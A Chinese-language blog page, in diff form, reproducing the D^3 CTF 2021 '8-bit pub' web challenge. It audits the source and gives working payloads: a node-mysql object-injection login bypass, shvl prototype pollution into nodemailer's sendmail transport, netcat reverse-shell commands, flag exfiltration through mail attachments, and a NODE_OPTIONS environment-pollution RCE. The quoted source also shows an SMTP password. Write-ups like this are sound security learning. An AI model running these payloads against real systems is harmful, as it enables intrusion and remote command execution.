@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en" class="light">
+<head>
+  <meta charset="utf-8">
+  
+  <title>
+    
+    D^3 CTF 2021 8-bit pub复现
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="me" href="https://mas.uniiem.com/@mizore" />
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/prism.min.js"></script>
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>
+
+  
+<link rel="stylesheet" href="/css/prism/material-light.css">
+
+  
+<link rel="stylesheet" href="/css/prism/material-dark.css">
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Noto+Sans+SC:wght@300&display=swap.css">
+
+  
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Welcome to s4mmy's blog" type="application/atom+xml">
+</head>
+<script>
+  function setIsNight(isNight) {
+    localStorage.setItem('isNight', isNight)
+  }
+
+  function getIsNight() {
+    return localStorage.getItem('isNight')
+  }
+
+  function switchTheme() {
+    let isNight = getIsNight()
+    if (isNight === 'false') {
+      document.documentElement.className = 'dark'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+      setIsNight('true')
+    } else {
+      document.documentElement.className = 'light'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+      setIsNight('false')
+    }
+  }
+
+  let isNight = getIsNight()
+  if (isNight == null) {
+    isNight = 'false'
+    setIsNight('false')
+  }
+  if (isNight === 'false') {
+    document.documentElement.className = 'light'
+  } else {
+    document.documentElement.className = 'dark'
+  }
+</script>
+
+<body>
+  <div class="show-area">
+    <header>
+  <ul class="nav">
+    <li class="nav-child">
+      <a href="/">首页</a>
+    </li>
+    <li class="nav-child">
+      <a href="/categories">分类</a>
+    </li>
+    <li class="nav-child">
+      <a href="/tags">标签</a>
+    </li>
+    <li class="nav-child">
+      <a href="/about">关于</a>
+    </li>
+    <li class="nav-child">
+      <a href="/collection">收藏</a>
+    </li>
+    <li class="nav-child">
+      <a href="/board">留言</a>
+    </li>
+  </ul>
+  <div class="theme-switcher" onclick="switchTheme()">🌞</div>
+  <script>
+    if (isNight === 'false') {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+    } else {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+    }
+  </script>
+</header>
+    <main class="main-body">
+  <div class="toc-container">
+    <div class="toc-toggle">
+      <i id="toc-b-icon" class="iconfont icon-liebiao-01" onclick="toggleShow()"></i>
+    </div>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#D-3-CTF-2021-8-bit-pub%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">D^3 CTF 2021 8-bit pub复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">方法二</span></a></li></ol></li></ol>
+  </div>
+  
+  <script>
+    var show = false
+    function toggleShow() {
+      if (show) {
+        document.getElementsByClassName('toc')[0].className = 'toc'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-liebiao-01'
+      } else {
+        document.getElementsByClassName('toc')[0].className = 'toc show'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-quxiao-01'
+      }
+      show = !show
+    }
+    document.getElementsByClassName('toc')[0].onclick = toggleShow
+  </script>
+  
+  <div class="article-header">
+    <h1 class="article-title">D^3 CTF 2021 8-bit pub复现</h1>
+    <div class="article-details">
+      <div class="article-post-date"><span>Posted at </span> 2023-06-28</div>
+      <div class="article-tags">
+        
+      </div>
+    </div>
+  </div>
+  <div class="article">
+  
+  <h3 id="D-3-CTF-2021-8-bit-pub复现"><a href="#D-3-CTF-2021-8-bit-pub复现" class="headerlink" title="D^3 CTF 2021 8-bit pub复现"></a>D^3 CTF 2021 8-bit pub复现</h3><p>这题是顺着群里师傅的链接摸到的，前前后后总共拖了三天才完成。。。。拖延症太难受了</p>
+<p>github题目仓库：<a target="_blank" rel="noopener" href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">CTFChallenges&#x2F;D3CTF2021&#x2F;8-bit_pub at main · crumbledwall&#x2F;CTFChallenges (github.com)</a></p>
+<p>根据师傅所说比赛的时候是给了源码的，所以我们先从源码入手，github上直接拖下来的题目文件是给docker用的，这里要先输入<code>npm install</code>补全一些依赖库，到时候审计的时候用得上。</p>
+<p><img src="/../../img/8-bit%20pub-images/1.png"></p>
+<p>首先尝试注册登录，然而并没有什么卵用，题目需要你拿到admin的账号</p>
+<p>在<code>route/index.js</code>处可以看到各个功能的路由，查看注册和登录的源码文件。</p>
+<p>可以看到如下代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"> sql.query(
+      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,
+      [username, password],
+      function (err, res) &#123;
+        if (err) &#123;
+          console.log(&quot;error: &quot;, err);
+          return done(err, null);
+        &#125; else &#123;
+          return done(null, res);
+        &#125;
+      &#125;
+    );
+  &#125;,
+&#125;;
+
+ signup: function (username, password, done) &#123;
+    sql.query(
+      &quot;SELECT * FROM users WHERE username &#x3D; ?&quot;,
+      [username],
+      function (err, res) &#123;
+.......</code></pre>
+
+<p>这里的sql语句使用了占位符，会对传进来的参数进行转义，所以没办法进行sql注入。</p>
+<p>但是在node-mysql文档的末尾有这么一段话</p>
+<blockquote>
+<p><strong>注意：</strong>与预处理语句不同的是，<code>?</code>就算出现在注释或字符串里，也会被替换成对应的值。</p>
+<p>不同类型的值会按不同的规则进行转义，规则如下：</p>
+<ul>
+<li>数字保持不变</li>
+<li>布尔值会被转换为<code>true</code>&#x2F;<code>false</code></li>
+<li>日期对象转换为<code>&#39;YYYY-mm-dd HH:ii:ss&#39;</code>字符串</li>
+<li>Buffer对象会被转换为十六进制字符串，例如<code>X&#39;0fa5&#39;</code></li>
+<li>字符串会被安全转义</li>
+<li>数组会被转换为列表，例如<code>[&#39;a&#39;, &#39;b&#39;]</code>会被转换为<code>&#39;a&#39;, &#39;b&#39;</code></li>
+<li>嵌套数组会被转换为分组列表(用于批量插入)，例如<code>[[&#39;a&#39;, &#39;b&#39;], [&#39;c&#39;, &#39;d&#39;]]</code>会被转换为<code>(&#39;a&#39;, &#39;b&#39;), (&#39;c&#39;, &#39;d&#39;)</code></li>
+<li>具有<code>toSqlString</code>方法的对象会调用<code>.toSqlString()</code>，并将返回的值作为初始SQL。</li>
+<li>对象上的可枚举属性会被转换为<code>key = &#39;val&#39;</code>键值对。如果属性值是一个函数，该属性会被忽略。如果属性值是对象，会对其调用toString()并将返回的值作为val。</li>
+<li><code>undefined</code>&#x2F;<code>null</code>会转换为<code>NULL</code></li>
+<li><code>NaN</code>&#x2F;<code>Infinity</code>保持不变。 MySQL目前并不支持。如果你强行插入这类值，将触发MySQL错误。</li>
+</ul>
+</blockquote>
+<p>这里是利用了传入对象会被转换为`key`&#x3D;val的键值对的这个特性</p>
+<p>所以这里的操作是要传入一个对象，使用的是json格式的数据</p>
+<p>在后面嵌套两个password的原因是就是传入一个对象。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre>
+
+<p>这样后台的查询语句是这样的,相当于构造了一个万能密码，SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】,【and】优先于【or】</p>
+<p>sql查询语句如下</p>
+<pre class="line-numbers language-none"><code class="language-none">username &#x3D; &#39;admin&#39; AND password &#x3D; &#96;password&#96; &#x3D; true</code></pre>
+
+<p>在这里我本来有个疑惑，就是在传入对象的时候为什么不能再<code>username</code>那里也传入一组对象比如</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&#123;&quot;username&quot;:admin&#125;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre>
+
+<p>但是经过尝试发现这样穿的话是不行的。后来问了其他师傅，在注册时传入上述的数据，然后进入数据库里面看了一下，发现如果传入的是对象的话解析之后传到数据库的内容都是NULL或者0，这样的话这句万能密码的sql语句就不能成立。</p>
+<p><img src="/../../img/8-bit%20pub-images/2.png"></p>
+<p>成功登陆之后我们可以直接跳转到admin页面</p>
+<p><img src="/../../img/8-bit%20pub-images/3.png"></p>
+<p>最早看到sql注入占位符的时候我以为是预编译，没办法注入（当然占位符也不能注入:（  ），所以我放弃了sql注入的想法，所以在这一步我原先的想法是去伪造session绕过身份验证去，因为我在通往admin的路由上看到还调用了auth.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let auth &#x3D; function (req, res, next) &#123;
+  if (!req.session.username) &#123;
+    return res.redirect(302, &quot;&#x2F;&quot;);
+  &#125;
+  if (req.session.username !&#x3D;&#x3D; &quot;admin&quot;) &#123;
+    if (req.method &#x3D;&#x3D;&#x3D; &quot;GET&quot;) &#123;
+      return res.sendView(&quot;forbidden.html&quot;);
+    &#125; else &#123;
+      return res.json(&#123; message: &quot;Forbidden.&quot; &#125;);
+    &#125;
+  &#125;
+  next();
+&#125;;
+
+module.exports &#x3D; auth;</code></pre>
+
+<p>这边验证的是<code>session.username</code>而<code>session.username</code>是从这里获得的</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (req, res) &#123;
+  user.signin(req.body.username, req.body.password, function (err, result) &#123;
+    if (err) &#123;
+      return res.status(500).json(&#123; message: err.message &#125;);
+    &#125;
+    if (result.length) &#123;
+      console.log(req.session)
+      req.session.username &#x3D; result[0].username;
+      return res.json(&#123; message: &quot;Signin success.&quot; &#125;);
+    &#125; else &#123;
+      return res.status(401).json(&#123; message: &quot;Username or password wrong.&quot; &#125;);
+    &#125;
+  &#125;);
+&#125;,</code></pre>
+
+<p>这里调用的user.signig()函数如下</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (username, password, done) &#123;
+    sql.query(
+      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,
+      [username, password],
+      function (err, res) &#123;
+        if (err) &#123;
+          console.log(&quot;error: &quot;, err);
+          return done(err, null);
+        &#125; else &#123;
+          return done(null, res);
+        &#125;
+      &#125;
+    );
+  &#125;,
+&#125;;</code></pre>
+
+<p>所以可以得到<code>result[0].username</code>的值即为<code>session.username</code></p>
+<p>因为这题的环境是用docker搭的，没办法直接用vscode调试，所以这里的<code>result</code>的值没办法知道是什么，但猜测是数据库查询返回的结果，其中username是列名，所以我们应该是没办法伪造session的。。:(</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>登陆成功后跳转到admin页面，看样子像一个发送邮件的页面。开始代码审计！</p>
+<p>首先根据路由来到<code>adminController.js</code>的<code>email</code>方法，乍一看好像没有什么利用点。。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">  email: async function (req, res) &#123;
+    let contents &#x3D; &#123;&#125;;
+
+    Object.keys(req.body).forEach((key) &#x3D;&gt; &#123;
+      shvl.set(contents, key, req.body[key]);
+    &#125;);
+
+    contents.from &#x3D; &#39;&quot;admin&quot; 2449970596@qq.com&#39;;
+
+    try &#123;
+      await send(contents);
+      return res.json(&#123;message: &quot;Success.&quot;&#125;);
+    &#125; catch (err) &#123;
+      return res.status(500).json(&#123; message: err.message &#125;);
+    &#125;
+  &#125;,
+&#125;;</code></pre>
+
+<p>这里有一个细节就是引入了shvl库（当时第一次审代码的时候完全没有放在心上，只是觉得有点奇怪而已，以后要多留意这些被引入的库）。</p>
+<p>其中在发信前调用了<code>shvl.set</code>方法，我们根据路径查找到<code>/node_modules/shvl/index&quot;</code>发现如下代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;
+  return !&#x2F;^(__proto__|constructor|prototype)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;
+    return obj[p] &#x3D; obj[p] || &#123;&#125;;
+  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;
+&#125;;</code></pre>
+
+<p>看样子有点像合并函数，但是ban了可以用来原型链污染的所有关键字，所以无法利用。</p>
+<p>其实这里出了点问题，我看网上师傅们的wp上的源码都是只有过滤<code>__proto__</code>而我手上的源码全过滤了，但是在实际测试中发现使用<code>constructor.prototype</code>又能绕过，orz.</p>
+<p>检查package.json里的shvl版本也是2.02，在github上也能看到到了2.03版本的修复中才加上了<code>constructor</code>和<code>prototype</code>。</p>
+<p><img src="/../../img/8-bit%20pub-images/4.png"></p>
+<p>这里就当做只过滤<code>__proto__</code>来进行审计吧</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;
+  return !&#x2F;^(__proto__)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;
+    return obj[p] &#x3D; obj[p] || &#123;&#125;;
+  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;
+&#125;;</code></pre>
+
+<p><strong>这里又get了一个审计小技巧，对于这种在github上开源且有release更新的话可以直接去查看修改了哪些代码，直接定位历史漏洞。</strong></p>
+<p>首先实现使用test进行正则判断，path的参数内是否含有<code>__proto__</code>，所以可以判断这里存在原型链污染漏洞且使用<code>constructor.prototype</code>绕过。（虽然不是很懂后半部分代码的具体含义。。。）</p>
+<p>找到原型链污染的地方后就要寻找利用点了。</p>
+<p>这里有两种寻找利用点的方法</p>
+<p>第一种</p>
+<p>在vscode全局搜索RCE利用点，例如<code>child_process</code>，可以在<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>里找到如下代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const spawn &#x3D; require(&#39;child_process&#39;).spawn;
+const packageData &#x3D; require(&#39;..&#x2F;..&#x2F;package.json&#39;);
+const shared &#x3D; require(&#39;..&#x2F;shared&#39;);
+.....
+class SendmailTransport &#123;
+    constructor(options) &#123;
+        options &#x3D; options || &#123;&#125;;
+
+        &#x2F;&#x2F; use a reference to spawn for mocking purposes
+        this._spawn &#x3D; spawn;
+
+        this.options &#x3D; options || &#123;&#125;;
+......</code></pre>
+
+<p>继续跟进查看</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">try &#123;
+           sendmail &#x3D; this._spawn(this.path, args);
+       &#125; catch (E) &#123;
+           this.logger.error(
+               &#123;
+                   err: E,
+                   tnx: &#39;spawn&#39;,
+                   messageId
+               &#125;,
+               &#39;Error occurred while spawning sendmail. %s&#39;,
+               E.message
+           );
+           return callback(E);
+       &#125;</code></pre>
+
+<p>跟进<code>this.path</code></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (options) &#123;
+            if (typeof options &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123;
+                this.path &#x3D; options;
+            &#125; else if (typeof options &#x3D;&#x3D;&#x3D; &#39;object&#39;) &#123;
+                if (options.path) &#123;
+                    this.path &#x3D; options.path;
+                &#125;
+                if (Array.isArray(options.args)) &#123;
+                    this.args &#x3D; options.args;
+                &#125;
+                this.winbreak &#x3D; [&#39;win&#39;, &#39;windows&#39;, &#39;dos&#39;, &#39;\r\n&#39;].includes((options.newline || &#39;&#39;).toString().toLowerCase());
+            &#125;
+        &#125;
+    &#125;</code></pre>
+
+<p>可以在这里看到要给<code>this.path</code>赋值的条件是<code>options</code>的类型要是对象和<code>option</code>的<code>args</code>属性是数组。</p>
+<p>接着要做的是检查如何触发</p>
+<p>回到<code>mail.js</code></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const nodemailer &#x3D; require(&quot;nodemailer&quot;);
+
+async function send(contents) &#123;
+  let transporter &#x3D; nodemailer.createTransport(&#123;
+    service: &quot;qq&quot;, &#x2F;&#x2F; Plz use your own smtp server for testing
+    port: 465,
+    secureConnection: true,
+    auth: &#123;
+      user: &quot;2449970596@qq.com&quot;,
+      pass: &quot;qlwwytxigkuzebdf&quot;,
+    &#125;,
+  &#125;);
+  return transporter.sendMail(contents);
+&#125;
+
+module.exports &#x3D; send;</code></pre>
+
+<p>这边可以继续跟进的地方是<code>createTransport</code>（没办法逐行debug真麻烦。。还要自己找）</p>
+<p>在<code>node_modules\nodemailer\lib\nodemailer.js</code>中可以找到如下源码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module.exports.createTransport &#x3D; function (transporter, defaults) &#123;
+....
+
+        if (options.pool) &#123;
+            transporter &#x3D; new SMTPPool(options);
+        &#125; else if (options.sendmail) &#123;
+            transporter &#x3D; new SendmailTransport(options);
+        &#125; else if (options.streamTransport) &#123;
+            transporter &#x3D; new StreamTransport(options);
+        &#125; else if (options.jsonTransport) &#123;
+....</code></pre>
+
+<p>只要<code>options.sendmail</code>的值为真，就会实例化<code>SendmailTransport</code>类，也就是我们上面要进行原型链污染的类</p>
+<p>至此可以尝试构造原型链污染如下</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+	&quot;constructor.prototype.sendmail&quot;:true,
+	&quot;constructor.prototype.path&quot;:&quot;sh&quot;,
+	&quot;constructor.prototype.args&quot;:[&quot;-c&quot;,&quot;nc ip port -e &#x2F;bin&#x2F;sh&quot;]
+&#125;</code></pre>
+
+<p>这个poc是用于反弹shell的，因为我的SMTP服务器配置有问题，所以只能这样做。</p>
+<p><img src="/../../img/8-bit%20pub-images/6.png"></p>
+<p><img src="/../../img/8-bit%20pub-images/5.png"></p>
+<p>这边放一下其他师傅通过任意读文获得flag的方式</p>
+<p>在nodemailer文档中发现使用attachments 可以进行任意文件读取</p>
+<p>先把文件写到tmp目录下</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;
+    &quot;constructor.prototype.sendmail&quot;:true,
+    &quot;constructor.prototype.path&quot;:&quot;sh&quot;,
+    &quot;constructor.prototype.args&quot;:[
+        &quot;-c&quot;,
+        &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;flag.txt&quot;
+    ]
+&#125;</code></pre>
+
+<p>再利用attachments带出</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;
+    &quot;to&quot;:&quot;i@example.com&quot;,
+    &quot;subject&quot;:&quot;flag&quot;,
+    &quot;constructor.prototype.attachments&quot;:[
+        &#123;
+            &quot;filename&quot;:&quot;flag.txt&quot;,
+            &quot;path&quot;:&quot;&#x2F;tmp&#x2F;flag.txt&quot;
+        &#125;
+    ]
+&#125;</code></pre>
+
+
+
+<p>以下是之前构造错误的原型链，没有双引号，等号当冒号用，nc反弹shell格式出错。。用于提醒自己</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+	constructor.prototype.path&#x3D;bash
+	constructor.prototype.args&#x3D;[nc,ip,port]
+&#125;</code></pre>
+
+
+
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个方法是污染原型链，先放个其他师傅的博客，后面再研究</p>
+<blockquote>
+<p>这里就比较直接了，因为nodemailer是有require<code>child_process</code>库的，那么我们可以使用<a target="_blank" rel="noopener" href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>方法，污染env和shell，先放payload</p>
+</blockquote>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;
+    &quot;constructor.prototype.sendmail&quot;: True,
+    &quot;constructor.prototype.shell&quot;:&quot;node&quot;,
+    &quot;constructor.prototype.env.NODE_DEBUG&quot;: &quot;require(&#39;child_process&#39;).execSync(&#39;nc ip port -e &#x2F;bin&#x2F;bash&#39;);process.exit();&#x2F;&#x2F;&quot;,
+    &quot;constructor.prototype.env.NODE_OPTIONS&quot;:&quot;-r &#x2F;proc&#x2F;self&#x2F;environ&quot;
+&#125;</code></pre>
+
+<blockquote>
+<p>这里污染了环境变量之后，每次以node执行命令的时候，就会加载<code>NODE_OPTIONS</code>选项，从而执行<code>/proc/self/environ</code>中存在的js代码，那么就很简单了，当默认使用发邮件的时候，spawn会调用默认的shell，也就是&#x2F;bin&#x2F;sh</p>
+</blockquote>
+<p>参考资料：</p>
+<p>47.103.121.189&#x2F;2023&#x2F;04&#x2F;20&#x2F;网鼎杯2023线下半决赛突破题errormsg复现&#x2F;</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lllffg/article/details/114548517">https://blog.csdn.net/lllffg/article/details/114548517</a></p>
+
+</div>
+  <o3o key="mizore" api="https://o3o.mizore.site:2333"></o3o>
+  
+<script src="/o3o/o3o.js"></script>
+
+  
+<link rel="stylesheet" href="/css/o3o.css">
+
+</main>
+    <footer>
+  <div class="footer-info"> Powerd by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> | Theme <a
+      target="_blank" rel="noopener" href="https://github.com/mizoreyo/hexo-theme-insnow">Insnow</a> </div>
+  <div class="footer-info">
+    <a class="footer-i" href=""><i class="iconfont icon-wechat"></i></a>
+    <a class="footer-i" target="_blank" rel="noopener" href="https://github.com/sammyLingsj"><i class="iconfont icon-github-fill"></i></a>
+    <a class="footer-i" href="/atom.xml"><i class="iconfont icon-rss"></i></a>
+    <a class="footer-i" href="mailto:sammyLinsj@outlook.com"><i class="iconfont icon-mail"></i></a>
+  </div>
+</footer>
+  </div>
+</body>
+
+
+</html>
